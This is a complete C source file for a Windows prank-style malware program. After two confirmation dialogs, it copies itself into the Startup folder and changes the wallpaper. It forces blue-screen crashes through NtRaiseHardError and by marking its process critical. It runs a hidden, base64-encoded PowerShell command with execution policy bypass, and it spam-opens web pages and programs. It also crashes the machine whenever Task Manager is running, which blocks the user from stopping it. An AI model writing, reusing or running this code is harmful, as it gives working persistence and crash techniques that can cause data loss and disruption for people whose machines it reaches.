#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

#define IMPORT_BIN(sect, file, sym) asm(    \
	".section " #sect "\n"                  \
	".balign 4\n"                           \
	".global " #sym "\n" #sym ":\n"         \
	".incbin \"" file "\"\n"                \
	".global _sizeof_" #sym "\n"            \
	".set _sizeof_" #sym ", . - " #sym "\n" \
	".balign 4\n"                           \
	".section \".text\"\n")

void CrashSystem()
{
	HMODULE ntdll = LoadLibrary("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	long int (*NtSetInformationProcess)(HANDLE, int, void *, unsigned long int);
	*(FARPROC *)&NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
	{
		BOOLEAN Tom;
		DWORD Jerry;
		((void (*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19L, 1, 0, &Tom);
		((void (*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000000, 0, 0, 0, 6, &Jerry);
	}

	if (RtlAdjustPrivilege && NtSetInformationProcess)
	{
		unsigned char Oogway;
		unsigned long int Critical = 1;
		((void (*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(20L, 1, 0, &Oogway);
		NtSetInformationProcess((void *)-1, 29, &Critical, sizeof Critical);
	}
}

void SelfDefence()
{
	char *Executable = "Taskmgr.exe";

	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	BOOL b = Process32First(h, &pe);

	while (b)
	{
		if (strcmp(pe.szExeFile, Executable) == 0)
		{
			CrashSystem();
			return;
		}
		b = Process32Next(h, &pe);
	}
}

void ExtractMusic(char *MusicPath)
{
	IMPORT_BIN(".rodata", "source/music.wav", Music);
	extern const char Music[], _sizeof_Music[];

	FILE *fp = fopen(MusicPath, "wb");
	fwrite(Music, 1, (intptr_t)_sizeof_Music, fp);
	fclose(fp);
}

void ChangeBackgroundImage(char *BackgroundImagePath, char *CurrentWallpaper, char *BackupWallpaper)
{
	CopyFile(CurrentWallpaper, BackupWallpaper, FALSE);

	IMPORT_BIN(".rodata", "source/background.png", BackgroundImage);
	extern const char BackgroundImage[], _sizeof_BackgroundImage[];

	FILE *fp = fopen(BackgroundImagePath, "wb");
	fwrite(BackgroundImage, 1, (intptr_t)_sizeof_BackgroundImage, fp);
	fclose(fp);

	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, BackgroundImagePath, SPIF_UPDATEINIFILE);
}

void OpenWebpages(int RandomWebpage)
{
	char *Webpages[5];
	Webpages[0] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
	Webpages[1] = "https://www.youtube.com/watch?v=9bZkp7q19f0";
	Webpages[2] = "https://www.youtube.com/watch?v=YFXlzKDjL8E";
	Webpages[3] = "https://www.youtube.com/watch?v=6ZfuNTqbHE8";
	Webpages[4] = "https://www.youtube.com/watch?v=QH2-TGUlwu4";

	ShellExecute(NULL, "open", Webpages[RandomWebpage], NULL, NULL, SW_SHOWNORMAL);
}

void OpenPrograms(int RandomProgram)
{
	char *Applications[8];
	Applications[0] = "calc.exe";
	Applications[1] = "notepad.exe";
	Applications[2] = "write.exe";
	Applications[3] = "explorer.exe";
	Applications[4] = "msconfig.exe";
	Applications[5] = "mspaint.exe";
	Applications[6] = "devmgmt.msc";
	Applications[7] = "control.exe";

	ShellExecute(NULL, "open", Applications[RandomProgram], NULL, NULL, SW_SHOWNORMAL);
}

void Payloads()
{
	/*
		$PlayWav=New-Object System.Media.SoundPlayer
		$PlayWav.SoundLocation="$env:USERPROFILE\\music.wav"
		$PlayWav.playsync()
	*/

	ShellExecute(NULL, "open", "powershell.exe", "-exec bypass -enc JABQAGwAYQB5AFcAYQB2AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBlAGQAaQBhAC4AUwBvAHUAbgBkAFAAbABhAHkAZQByADsAJABQAGwAYQB5AFcAYQB2AC4AUwBvAHUAbgBkAEwAbwBjAGEAdABpAG8AbgA9ACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAFwAbQB1AHMAaQBjAC4AdwBhAHYAIgA7ACQAUABsAGEAeQBXAGEAdgAuAHAAbABhAHkAcwB5AG4AYwAoACkA", NULL, SW_HIDE);

	for (int i = 0; i < 69; i++)
	{
		int RandomWebpage = rand() % 5;
		OpenWebpages(RandomWebpage);
		Sleep(690);

		int RandomProgram = rand() % 8;
		OpenPrograms(RandomProgram);
		Sleep(690);
		SelfDefence();
	}
}

void RestoreEverything(char *DeleteFilePath, char *MusicPath, char *BackgroundImagePath, char *CurrentWallpaper, char *BackupWallpaper, char *StartupExecutable)
{
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, BackupWallpaper, SPIF_UPDATEINIFILE);

	Sleep(500);
	DeleteFile(DeleteFilePath);
	DeleteFile(MusicPath);
	DeleteFile(BackgroundImagePath);
	DeleteFile(CurrentWallpaper);
	DeleteFile(BackupWallpaper);

	char TempFile[MAX_PATH];
	GetEnvironmentVariable("TEMP", TempFile, MAX_PATH);
	strcat(TempFile, "\\DELETE_ME");

	if (GetFileAttributes(TempFile) != INVALID_FILE_ATTRIBUTES)
	{
		DeleteFile(TempFile);
	}

	MoveFile(StartupExecutable, TempFile);
}

int main(void)
{
	SelfDefence();

	char CurrentExecutable[MAX_PATH];
	GetModuleFileName(NULL, CurrentExecutable, MAX_PATH);

	char StartupExecutable[MAX_PATH];
	GetEnvironmentVariable("APPDATA", StartupExecutable, MAX_PATH);
	strcat(StartupExecutable, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe");

	char DeleteFilePath[MAX_PATH];
	GetEnvironmentVariable("APPDATA", DeleteFilePath, MAX_PATH);
	strcat(DeleteFilePath, "\\..\\..\\DELETE");

	char MusicPath[MAX_PATH];
	GetEnvironmentVariable("APPDATA", MusicPath, MAX_PATH);
	strcat(MusicPath, "\\..\\..\\music.wav");

	char BackgroundImagePath[MAX_PATH];
	GetEnvironmentVariable("APPDATA", BackgroundImagePath, MAX_PATH);
	strcat(BackgroundImagePath, "\\..\\..\\background.png");

	char CurrentWallpaper[MAX_PATH];
	SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, CurrentWallpaper, 0);

	char BackupWallpaper[MAX_PATH];
	sprintf(BackupWallpaper, "%s\\..\\..\\wallpaper.bmp", getenv("APPDATA"));

	if (GetFileAttributes(DeleteFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		RestoreEverything(DeleteFilePath, MusicPath, BackgroundImagePath, CurrentWallpaper, BackupWallpaper, StartupExecutable);
		ExitProcess(0);
	}

	if (strcmp(CurrentExecutable, StartupExecutable) == 0)
	{
		FILE *fp = fopen(DeleteFilePath, "w");
		fclose(fp);

		Payloads();
		CrashSystem();
	}

	if (MessageBox(NULL, "If you see this message without knowing what you have just executed, just press No and nothing will happen.", "Would you like to run this program?", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES &&
		MessageBox(NULL, "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS PROGRAM!\r\n\r\nEXECUTE IT ANYWAY?",
				   "THIS IS THE LAST WARNING!", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES)
	{
		MoveFile(CurrentExecutable, StartupExecutable);
		ExtractMusic(MusicPath);
		ChangeBackgroundImage(BackgroundImagePath, CurrentWallpaper, BackupWallpaper);

		CrashSystem();
	}
}